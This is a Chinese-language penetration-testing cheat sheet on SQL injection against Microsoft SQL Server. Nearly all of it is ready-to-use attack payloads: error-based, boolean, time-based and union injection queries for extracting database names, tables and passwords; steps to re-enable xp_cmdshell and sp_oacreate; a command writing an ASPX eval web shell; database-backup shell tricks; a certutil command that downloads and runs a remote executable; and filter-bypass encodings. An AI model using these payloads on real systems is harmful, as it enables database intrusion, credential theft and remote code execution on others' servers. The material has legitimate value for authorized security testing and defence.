## mssql 注入

查询数据库名称
```
select name from master.dbo.sysdatabases;
```
`master、model、msdb、tempdb`是mssql的默认数据库

查询用户权限
```
select IS_MEMBER('db_owner');
```
服务器角色包含：`sysadmin、serveradmin、securityadmin、processadmin、setupadmin、bulkadmin、diskadmin、dbcreator、public`
数据库角色包含：`db_owner、db_securityadmin、db_accessadmin、db_backupoperator、db_ddladmin、db_datawriter、db_datareader、db_denydatewriter、db_denydatareader`

查询数据库版本
```
select @@version;
```

查询当前数据库名
```
select db_name();
```

查询服务器名称
```
select HOST_NAME();
select @@SERVERNAME;
```

爆当前数据库
```
select * from xxx where id=1 and db_name()>0;
select * from xxx where id=1 and db_name()>'e';
```

查询数据库下的所有表
```
select * from INFORMATION_SCHEMA.TABLES;
```

爆表名，xx代表表名。`1=`可能出现数据类型转换错误，形成报错注入。或用对应类型的`'e'<`来判断名称
```
select * from xxx where id=1 and 1=(select top 1 name from sysobjects where xtype='u' and name='xx');
select * from xxx where id=1 and 'e'<(select top 1 name from sysobjects where xtype='u' and name='xx');

select * from xxx where id=1 and 'e'<(select top 1 TABLE_NAME from INFORMATION_SCHEMA.TABLES);
```

爆列名
```
select * from xxx where id=1 and 'b'>(select top 1 name from syscolumns where id=(select id from sysobjects where name='xx') and name<>'id');
```

爆数据
```
select * from xxx where id=1 and 1=(select top 1 password from xx);
select * from xxx where id=1 and 'C'<(select top 1 password from xx);
```

报错注入
```
select * from xxx where id=1 (select CAST(USER as int));
select * from xxx where id=1 (select convert(int,USER));
select * from xxx where id=1 select 1 union (select CAST(USER as int))
// 用declare定义变量并执行，还可对变量进行HEX和ASCII编码
select * from xxx where id=1;declare @a nvarchar(2000) set @a='select convert(int,@@version)' exec(@a);
// ASCII编码
select * from HrmResourceManager where id=1;declare @a nvarchar(2000) set @a=CHAR(115) + CHAR(101) + CHAR(108) + CHAR(101) + CHAR(99) + CHAR(116) + CHAR(32) + CHAR(99) + CHAR(111) + CHAR(110) + CHAR(118) + CHAR(101) + CHAR(114) + CHAR(116) + CHAR(40) + CHAR(105) + CHAR(110) + CHAR(116) + CHAR(44) + CHAR(64) + CHAR(64) + CHAR(118) + CHAR(101) + CHAR(114) + CHAR(115) + CHAR(105) + CHAR(111) + CHAR(110) + CHAR(41) exec(@a);
```

盲注
```
// 布尔盲注
select * from xxx where id=1 and ascii(substring((select top 1 name from master.dbo.sysdatabases),1,1))>=109;
// 时间盲注
select * from xxx where id=1;if(ascii(substring((select top 1 name from master.dbo.sysdatabases),1,1)))>1 WAITFOR DELAY '0:0:5';
```

联合注入
```
// null的数量需要与xxx表的列数相同
select * from xxx where id=1 union select null,null,null;
```

列目录
```
execute master..xp_dirtree 'c:' // 列出C盘下的所有文件和目录
execute master..xp_dirtree 'c:',1  // 只列出C文件夹
```

写shell
```
// 创建文件夹表
select * from xxx where id=1;CREATE TABLE testtemp (dir varchar(8000),num int,num1 int);
// 将C盘的文件夹名称写入数据表
select * from xxx where id=1;insert into testtemp(dir,num,num1) execute master..xp_dirtree 'C:',1,1;
// 创建cmd执行表
select * from xxx where id=1;CREATE TABLE cmdtemp (dir varchar(8000));
// 将cmd搜索结果写入表
select * from xxx where id=1;insert into cmdtemp(dir) exec master..xp_cmdshell 'for /r c:\ %i in (lululu.jsp) do @echo %i';
// 指定目录写文件
select * from xxx where id=1;exec master..xp_cmdshell 'echo ^<%@ Page Language="Jscript"%^>^<%eval(Request.Item["pass"],"unsafe");%^> > c:\\lululu.aspx' ;
```

xp_cmdshell不存在的解决方法
```
// 如果master..xp_cmdshell未开启,用如下命令开启
EXEC sp_configure 'show advanced options', 1;  //允许更改参数
RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1;  //开启xp_cmdshell
RECONFIGURE;

// 如果master..xp_cmdshell被删除，恢复sp_oacreate
EXEC sp_configure 'show advanced options', 1;  //允许更改参数
RECONFIGURE WITH OVERRIDE;
EXEC sp_configure 'Ole Automation Procedures',1;
RECONFIGURE WITH OVERRIDE;
EXEC sp_configure 'show advanced options',0;
RECONFIGURE WITH OVERRIDE;
```

sp_oacreate执行命令
```
declare @shell int exec sp_oacreate 'wscript.shell',@shell output exec sp_oamethod @shell,'run',null,'c:\windows\system32\cmd.exe /c calc.exe'

declare @o int
exec sp_oacreate 'Shell.Application', @o out
exec sp_oamethod @o, 'ShellExecute',null, 'cmd.exe','cmd /c net user >c:\test.txt','c:\windows\system32','','1';
```

差异备份
```
//这一步很可能出现拒绝访问错误，说明没有文件夹操作权限。只有给予该文件夹读写权限才能执行
backup database xxxx to disk='c:\Users\xxxxx'
backup database xxxx to disk='c:\Users\xxxxx' WITH DIFFERENTIAL,FORMAT;--

// 日志备份
alter database ecology set RECOVERY FULL; //先将数据库恢复模式设为完整模式
backup log ecology to disk='C:\Users\xxx\log.bak' with init
```

站库分离(网站和数据库分别在不同的内网服务器上)场景下getshell
```
exec master.dbo.xp_cmdshell 'cd c:\Users\xxxxx & certutil -urlcache -split -f http://ip:port/file.exe'; //从远程下载恶意文件并运行，除certutil外还可用vbs、bitsadmin、powershell、ftp
exec master.dbo.xp_cmdshell 'cd c:\Users\xxxxx & file.exe';
```

其他的一些进阶操作，参考：https://github.com/aleenzz/MSSQL_SQL_BYPASS_WIKI/blob/master/2.2.MSSQL%E6%8F%90%E6%9D%83%E4%B8%8E%E7%AB%99%E5%BA%93%E5%88%86%E7%A6%BB.md

特殊符号
```
注释: /* */  --
空白符号: /**/
加号: %2b （查询多条数据）
```

一些绕过
```
// 表名转换为[表名]
select top 1 name from sysobjects -> select top 1 name from[sysobjects] 

// 注释
union select -> union/*select*/
union select -> union/*!1*/select--*/

// 注释+换行(%0a) , %20空格
select * from xxx where id=1--/*%0aif (select IS_SRVROLEMEMBER('sysadmin'))=1 WAITFOR DELAY '0:0:5'--%20*/
select * from xxx where id=1--/*%0aexec xp_create_subdir 'c:\text'--%20*/
```

mssql对象类型
```
AF = 聚合函数 (CLR)
C = CHECK 约束
D = 默认或默认约束
F = FOREIGN KEY 约束
L = 对数
FN = 标量函数
FS = 装配 (CLR) 标量函数
FT = 装配(CLR) 表值函数
IF = 内联表函数
IT = 内部表
P = 存储过程
PC = 程序集 (CLR) 存储过程
PK = 主键约束（类型为 K）
RF = 复制过滤器存储过程
S = 系统表
SN = 同义词
SO = 序列
SQ = 服务队列
TA = 装配 (CLR) DML 触发器
TF = 表函数
TR = SQL DML 触发器
TT = 表类型
U = 用户表
UQ = UNIQUE 约束（类型为 K）
V = 视图
X = 扩展存储过程
```

